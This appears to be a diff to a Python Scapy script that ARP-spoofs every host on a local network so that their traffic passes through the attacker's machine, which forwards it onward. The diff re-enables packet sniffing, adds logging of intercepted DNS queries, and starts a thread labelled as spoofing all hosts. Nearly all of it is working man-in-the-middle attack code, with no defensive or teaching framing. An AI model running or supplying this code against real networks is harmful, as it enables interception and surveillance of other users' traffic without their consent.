@@ -26,11 +26,14 @@ def handle_Packet(pkt):
     if packet is an ARP packet check if new device needs to be added to list
     send it forward
     """
+
     if ARP not in pkt:
         #print pkt.show()
         functions.sendPacket(pkt,gatewayMAC)
+        if DNS in pkt:
+            logging.info('DNS query:',pkt[DNS].qd)
     else:
-        if pkt[ARP].op == 2: # is-at
+        if pkt[ARP].op == 2: #check if ARP operation is: is-at
 
             address=pkt[ARP].psrc #extract IP address
             addressesLock.acquire()
@@ -56,7 +59,7 @@ def arpSpoof(router,localHost):
 
                     victimPacket = Ether()/ARP(op=2,psrc = router, pdst=host)#create arp packets
                     gatewayPacket=Ether()/ARP(op=2,psrc=host,pdst=router)
-                    logging.debug('spoofng: '+victimPacket[ARP].pdst)
+                    logging.debug('spoofing: '+victimPacket[ARP].pdst)
                     sendp(victimPacket)#send packets
                     sendp(gatewayPacket)
 
@@ -71,12 +74,11 @@ def setup():
     get all necessary values for the program to run
     and start all threads
     """
-    #get default gateway and local IP address
+    #get default gateway, local IP address and local MAC address
     global gatewayMAC
-    logging.debug('check')
     defaultGateway,localHost,gatewayMAC=functions.getLocalhostAddress()
-    #print defaultGateway,gatewayMAC,localHost
-    logging.debug('got default gateway and local IP')
+    print defaultGateway,gatewayMAC,localHost
+    logging.debug('got default gateway and local IP and MAC')
 
     global localAddresses
     localAddresses=functions.get_Local_Addresses(defaultGateway,localHost) #get addresses of all hosts on network
@@ -84,8 +86,10 @@ def setup():
     print localAddresses
 
     arpThread=Thread(target=arpSpoof,args=(defaultGateway,localHost,))
-    arpThread.start()
     logging.debug('created thread for ARP spoofing')
+    arpThread.start()
+    logging.debug('spoofing all hosts on network')
+
 
 
 
@@ -104,7 +108,7 @@ def main():
     logging.info('setup complete')
 
 
-    #sniff(prn=handle_Packet)
+    sniff(prn=handle_Packet)
 
     while True:
         pass
